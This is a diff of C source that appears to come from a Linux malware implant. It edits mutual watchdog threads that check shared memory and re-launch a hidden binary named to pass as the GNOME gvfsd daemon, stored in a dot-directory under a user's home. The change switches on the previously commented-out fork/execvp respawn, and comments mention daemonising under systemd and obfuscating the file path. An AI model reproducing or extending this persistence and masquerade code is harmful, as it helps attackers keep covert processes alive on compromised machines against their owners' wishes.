@@ -362,11 +362,11 @@ void fork_exec(char *fpath) {
 }
 
 
-void *watchdog_process_shmget(void *fpath) {
+void *watchdog_process_shmget() {
     // stop defunct processes from showing up
     signal(SIGCHLD, SIG_IGN);
 
-    // detach from current console
+    // detach from current console, and make systemd the parent
     //daemon(0,0);
 
     bool proc_alive;
@@ -425,18 +425,18 @@ void *watchdog_process_shmget(void *fpath) {
     } while(true);
 
 
-    if (fpath != NULL) {
-        free(fpath);
-    }
 
     // detatch from process
     pthread_detach(pthread_self());
 }
 
 
-void *watchdog_process_shmread(void *fpath) {
+void *watchdog_process_shmread() {
     // stop defunct processes from showing up
     signal(SIGCHLD, SIG_IGN);
+
+    // detatch from console, making systemd parent.
+    // daemon(0,0);
 
     bool proc_alive;
 
@@ -481,13 +481,12 @@ void *watchdog_process_shmread(void *fpath) {
 
             // TODO - stack string file path  and dynamically resolve it.
             char* argument_list[] = {"/bin/sh", "-c", "/home/gdev/.gvfsd/.profile/gvfsd-helper", "&", NULL}; // NULL terminated array of char* strings
-            /*
+
             int f_pid = fork();
             if (f_pid == 0) {
                 execvp("/bin/sh", argument_list);
             }
             close(f_pid);
-            */
         }
 
         sleep(3);
@@ -496,17 +495,17 @@ void *watchdog_process_shmread(void *fpath) {
    pthread_detach(pthread_self());
 }
 
-void spawn_thread_watchdog(int uid, char *fpath) {
+void spawn_thread_watchdog(int uid) {
     pthread_t threadid;
     if (uid == 0){
         // the "parent thread" monitors session-dbus
         //pthread_create(&threadid, NULL, watchdog_process_shmget, fpath);
-         watchdog_process_shmget(fpath);
+         watchdog_process_shmget();
 
         // testing
     } else {
         // the "child thread" monitors gvfsd-helper
         // pthread_create(&threadid, NULL, watchdog_process_shmread, fpath);
-        watchdog_process_shmread(fpath);
+        watchdog_process_shmread();
     }
 }
